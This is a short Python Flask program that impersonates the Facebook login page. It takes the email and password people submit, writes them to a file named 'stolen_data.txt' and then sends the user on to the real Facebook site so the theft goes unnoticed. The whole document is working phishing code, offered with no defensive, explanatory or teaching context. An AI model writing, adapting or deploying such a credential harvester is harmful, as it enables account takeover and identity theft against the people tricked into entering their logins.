from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('facebook_login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    with open('stolen_data.txt', 'a') as f:
        f.write(f"Email: {email}, Password: {password}\n")
    
    return redirect('https://www.facebook.com')

if __name__ == '__main__':
    app.run(debug=True, port=5000)
